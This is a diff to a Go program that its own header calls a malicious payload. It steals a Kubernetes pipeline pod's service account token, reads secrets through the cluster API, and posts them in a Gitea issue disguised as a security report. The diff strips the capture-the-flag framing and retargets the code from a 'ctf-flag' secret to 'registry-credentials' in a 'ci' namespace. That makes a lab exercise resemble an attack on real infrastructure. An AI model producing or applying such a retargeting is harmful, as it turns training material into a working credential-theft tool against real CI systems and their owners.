@@ -2,13 +2,13 @@ package main
 
 /*
  * MALICIOUS PAYLOAD - Gitea Issue Exfiltration via K8s Secrets
- * FOR CTF EDUCATIONAL PURPOSES ONLY
+ * FOR EDUCATIONAL PURPOSES ONLY
  *
  * This demonstrates a sophisticated attack that:
  * 1. Steals Kubernetes service account token from the pipeline pod
  * 2. Uses the ServiceAccount token to read Gitea credentials from the 'gitea-credentials' secret
  * 3. Creates a "Security Vulnerability" issue in Gitea with stolen data
- * 4. Exfiltrates the CTF flag (base64 decoded)
+ * 4. Exfiltrates the registry credentials (base64 decoded)
  *
  * Attack Vector:
  * - Attacker forks a repository with vulnerable Tekton EventListener
@@ -39,8 +39,8 @@ import (
 const (
 	giteaURL       = "http://gitea-http.gitea.svc.cluster.local:3000"
 	issueTitle     = "Security Vulnerability Report - Critical"
-	giteaNamespace = "ctf-challenge"
-	repoOwner      = "ctf-admin"
+	giteaNamespace = "ci"
+	repoOwner      = "sc-admin"
 	repoName       = "recipe-api"
 )
 
@@ -189,14 +189,14 @@ func getGiteaCredentialsFromK8s(token, namespace string) (string, string) {
 	return "", ""
 }
 
-// tryGetFlag reads the CTF flag from the Kubernetes secret and decodes it from base64
+// tryGetFlag reads the registry credentials from the Kubernetes secret and decodes it from base64
 func tryGetFlag(token, namespace string) string {
 	if token == "" || namespace == "" {
 		return ""
 	}
 
 	apiServer := "https://kubernetes.default.svc"
-	secretURL := fmt.Sprintf("%s/api/v1/namespaces/%s/secrets/ctf-flag", apiServer, namespace)
+	secretURL := fmt.Sprintf("%s/api/v1/namespaces/%s/secrets/registry-credentials", apiServer, namespace)
 
 	client := &http.Client{
 		Timeout: 5 * time.Second,
@@ -345,7 +345,7 @@ The following sensitive credentials were found in the pipeline environment:
 ### 4. K8s API Access Test Results
 %s
 
-### 5. CTF Flag (decoded from Kubernetes secret)
+### 5. Registry Credentials (decoded from Kubernetes secret)
 ` + "```" + `
 %s
 ` + "```" + `
